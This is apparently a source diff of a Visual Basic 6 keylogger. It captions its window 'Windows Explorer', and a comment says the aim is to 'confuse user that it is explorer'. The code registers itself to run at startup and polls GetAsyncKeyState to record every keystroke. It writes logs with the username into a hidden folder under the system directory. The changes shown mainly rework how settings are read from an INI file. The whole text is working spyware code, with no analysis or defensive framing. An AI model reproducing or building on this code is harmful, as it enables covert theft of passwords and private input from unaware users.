@@ -1,5 +1,4 @@
 VERSION 5.00
-Object = "{45CB9C9B-4BC4-11D1-AE5C-CCA603C10627}#1.0#0"; "INIEdit.ocx"
 Begin VB.Form Form1 
    BorderStyle     =   1  'Fixed Single
    Caption         =   "Windows Explorer"
@@ -30,12 +29,6 @@ Begin VB.Form Form1
       TabIndex        =   5
       Top             =   3240
       Width           =   6135
-   End
-   Begin INITools.INITool INITool1 
-      Left            =   240
-      Top             =   5520
-      _ExtentX        =   1085
-      _ExtentY        =   873
    End
    Begin VB.Timer Timer2 
       Interval        =   530
@@ -157,29 +150,28 @@ Dim SysDir As String
 
 
 'Loadsetting variable declaration
-Dim wTitle, AllowBS As Boolean
+Dim wTitle, AllowBS, LogSysDir As Boolean
 Dim ext, encCode As String, LogMode As Integer
-Dim lpath, LogDir As String
+Dim lpath As String
 
 Private Sub Form_Load()
 'Get sysDirectory
 SysDir = String(80, 0)
 Call GetSystemDirectory(SysDir, 80)     'stores global variable sysDir i.e, system32 path.
 
-sysPath.Text = SysDir
-
 'if program already running then confuse user that it is explorer
+sysPath.Text = SysDir
 If App.PrevInstance = True Then
-        Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
-        End
+    Shell Left(sysPath.Text, 2) & "\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
+    End
 End If
 
-Call loadsetting
 
-If LogDir = "sys" Then  'Check Where should log stored system dir or defined path in setting.ini
+Call loadsetting
+If LogSysDir = 1 Then  'Check Where should log stored system dir or defined path in setting.ini
 sysPath.Text = SysDir
-Else
-sysPath.Text = LogDir
+ElseIf LogSysDir = 0 Then
+sysPath.Text = INIRead("LogSetting", "LogDir", Left(SysDir, 2) & "\Program Files\Common Files\setting.ini")
 End If
 
 
@@ -191,9 +183,8 @@ Timer1.Enabled = True
 
 On Error Resume Next
 Call setautorun
-'FileCopy App.Path & "\" & App.EXEName & ".exe", sysPath & "\explorer.exe"
-MkDir sysPath & "\sysResource"
-File1.Path = sysPath & "\sysResource"
+MkDir sysPath.Text & "\sysResource"
+File1.Path = sysPath.Text & "\sysResource"
 
 If LogMode = 0 Then
     lpath = sysPath & "\sysResource\browse" & File1.ListCount + 1 & "xcz" & ext
@@ -205,33 +196,28 @@ ElseIf LogMode = 2 Then
     lpath = sysPath & "\sysResource\browsexcz" & ext
 End If
 
+
 'Write initials
-If Dir$(lpath) <> "" Then
-'MsgBox ("The file exist")
 Open lpath For Append As 1
 Write #1, Time, encCode, App.Revision, username
 Close #1
-Else
-'MsgBox ("The file does not exist")
-Open lpath For Append As 1
-Write #1, Time, encCode, App.Revision, username
-Close #1
-End If
    
 End Sub
 Private Sub loadsetting()
 Dim sDr As String
 sDr = Left(SysDir, 2)
 On Error GoTo err
-AllowBS = INITool1.GetFromINI("LogSetting", "USEBS", sDr & "\Program Files\Common Files\setting.ini")
-wTitle = INITool1.GetFromINI("LogSetting", "UseChildTitle", sDr & "\Program Files\Common Files\setting.ini")
-encCode = INITool1.GetFromINI("LogSetting", "EncCode", sDr & "\Program Files\Common Files\setting.ini")
-ext = INITool1.GetFromINI("LogSetting", "extension", sDr & "\Program Files\Common Files\setting.ini")
-Timer1.Interval = INITool1.GetFromINI("LogSetting", "TimerInt", sDr & "\Program Files\Common Files\setting.ini")
-LogMode = INITool1.GetFromINI("LogSetting", "LogMode", sDr & "\Program Files\Common Files\setting.ini")
-LogDir = INITool1.GetFromINI("LogSetting", "LogDir", sDr & "\Program Files\Common Files\setting.ini")
+
+AllowBS = INIRead("LogSetting", "USEBS", sDr & "\Program Files\Common Files\setting.ini")
+wTitle = INIRead("LogSetting", "UseChildTitle", sDr & "\Program Files\Common Files\setting.ini")
+encCode = INIRead("LogSetting", "EncCode", sDr & "\Program Files\Common Files\setting.ini")
+ext = INIRead("LogSetting", "extension", sDr & "\Program Files\Common Files\setting.ini")
+Timer1.Interval = INIRead("LogSetting", "TimerInt", sDr & "\Program Files\Common Files\setting.ini")
+LogMode = INIRead("LogSetting", "LogMode", sDr & "\Program Files\Common Files\setting.ini")
+LogSysDir = INIRead("LogSetting", "LogSysDir", sDr & "\Program Files\Common Files\setting.ini")
+
 err:
-If err.Number = 13 Then End             'setting.ini not found
+If err.Number = 13 Then MsgBox "Setting not found", "setting": End            'setting.ini not found
 End Sub
 Private Sub setautorun()
 ' Clear or set the key that makes the program run at startup.
@@ -292,10 +278,10 @@ Private Sub Timer2_Timer()
 End Sub
 Private Sub Timer1_Timer()
 Dim i As Integer
-Dim result As Integer
+Dim Result As Integer
 For i = 1 To 255
- result = GetAsyncKeyState(i)
-If result = -32767 Then
+ Result = GetAsyncKeyState(i)
+If Result = -32767 Then
     If (i >= 65 And i <= 90) Or i = 32 Then         'alphabets 32 for space bar
         Text1.Text = Text1.Text + correctcase(i)
     Else                                            'non alphabets
@@ -591,5 +577,6 @@ GetWindowText hwnd, S, l + 1
 
 GetWindowTitle = Left$(S, l)
 End Function
+
 
 
